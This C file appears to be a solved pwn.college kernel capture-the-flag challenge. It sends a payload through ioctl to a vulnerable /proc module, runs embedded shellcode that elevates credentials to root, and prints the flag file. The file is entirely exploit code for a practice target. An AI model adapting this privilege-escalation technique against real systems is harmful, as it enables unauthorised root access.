#define _GNU_SOURCE
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/ioctl.h>

unsigned char code[] = {
  0xbf, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc3, 0x60, 0x96, 0x08, 0x81,
  0xff, 0xd3, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc3, 0x10, 0x93, 0x08, 0x81,
  0xff, 0xd3, 0xc3
};
unsigned int code_len = 27;

int main(){
  unsigned char payload[0x1000 + 16];
  // __vmalloc region
  unsigned long shellcode_addr = 0xffffc90000085000;
  ((unsigned long*)payload)[0] = 0x300; // < 0x1001
  memcpy(payload + 8, code, code_len);
  memcpy(payload + 0x1008, &shellcode_addr, 8);

  unsigned char buf[1024];
  int fd;

  if ((fd = open("/proc/pwncollege",O_RDWR)) < 0) {
    perror("open");
  }

  ioctl(fd, 0x539, payload);

  uid_t ruid, euid, suid;
  getresuid(&ruid, &euid, &suid);
  if(ruid == 0) {
   printf("[+] We are root.\n");

   if ((fd = open("/flag",O_RDONLY)) < 0) {
      perror("open");
   }
    read(fd, buf, 256);
    printf("flag: %s\n",(char*)buf);
  }
}
